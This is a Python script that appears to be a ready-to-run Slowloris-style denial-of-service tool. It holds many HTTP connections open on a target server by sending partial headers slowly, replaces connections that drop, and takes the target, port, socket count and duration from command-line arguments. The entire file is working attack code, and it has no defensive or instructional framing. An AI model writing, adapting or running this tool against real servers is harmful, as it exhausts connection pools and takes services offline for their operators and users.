#!/usr/bin/env python3

"""
Slow-Rate Attack Script (Slowloris variant)
- Creates connections to the server and sends partial requests at a very slow rate
- Used to exhaust server connection pool
- Compatible with Python 3.10
"""

import socket
import random
import time
import argparse
from datetime import datetime
import threading

# List of user agents for randomization
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
]

# Global variables
list_of_sockets = []
socket_count = 0
stop_event = None

def init_socket(host, port):
    """Initialize a socket connection to the target"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((host, port))
        
        # Send a partial HTTP header
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        
        return s
    except socket.error:
        return None

def slow_rate_attack(host, port=80, socket_count=200, duration=60):
    """
    Execute a Slow-Rate attack against the target
    
    :param host: Target host
    :param port: Target port (default: 80)
    :param socket_count: Number of sockets to use (default: 200)
    :param duration: Attack duration in seconds (default: 60)
    """
    global list_of_sockets, stop_event
    
    print(f"[*] Starting Slow-Rate attack against {host}:{port}")
    print(f"[*] Target socket pool: {socket_count}")
    print(f"[*] Attack will run for {duration} seconds")
    print(f"[*] Started at: {datetime.now().strftime('%H:%M:%S')}")
    
    stop_event = threading.Event()
    start_time = time.time()
    
    # Create initial batch of sockets
    print("[*] Creating sockets...")
    for _ in range(socket_count):
        try:
            s = init_socket(host, port)
            if s:
                list_of_sockets.append(s)
                sys.stdout.write(f"\r[*] Created {len(list_of_sockets)} sockets")
                sys.stdout.flush()
        except Exception:
            pass
    
    print(f"\n[*] Successfully created {len(list_of_sockets)} sockets")
    
    # Main attack loop
    try:
        while time.time() - start_time < duration and not stop_event.is_set():
            # Keep socket connections alive
            for s in list(list_of_sockets):
                try:
                    # Send partial headers every 15 seconds to keep connections open
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                except socket.error:
                    list_of_sockets.remove(s)
            
            # Create new sockets to replace lost ones
            diff = socket_count - len(list_of_sockets)
            if diff > 0:
                print(f"[*] Creating {diff} new sockets...")
                for _ in range(diff):
                    try:
                        s = init_socket(host, port)
                        if s:
                            list_of_sockets.append(s)
                    except Exception:
                        pass
                print(f"[*] Socket count: {len(list_of_sockets)}")
            
            # Status update
            elapsed = time.time() - start_time
            print(f"\r[*] Running attack | Sockets: {len(list_of_sockets)} | Elapsed: {elapsed:.2f}s / {duration}s", end="")
            
            # Sleep between attempts
            time.sleep(15)
            
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    finally:
        # Clean up
        stop_event.set()
        print("\n[*] Cleaning up sockets...")
        for s in list_of_sockets:
            try:
                s.close()
            except:
                pass
        
        total_time = time.time() - start_time
        print(f"\n[*] Attack completed")
        print(f"[*] Maximum socket count: {socket_count}")
        print(f"[*] Final socket count: {len(list_of_sockets)}")
        print(f"[*] Total time: {total_time:.2f} seconds")

if __name__ == "__main__":
    import sys
    
    # Setup argument parser
    parser = argparse.ArgumentParser(description='Slow-Rate Attack Tool')
    parser.add_argument('-t', '--target', required=True, help='Target host')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-s', '--sockets', type=int, default=150, help='Number of sockets to use (default: 150)')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds (default: 60)')
    
    args = parser.parse_args()
    
    # Execute attack
    slow_rate_attack(args.target, args.port, args.sockets, args.duration)
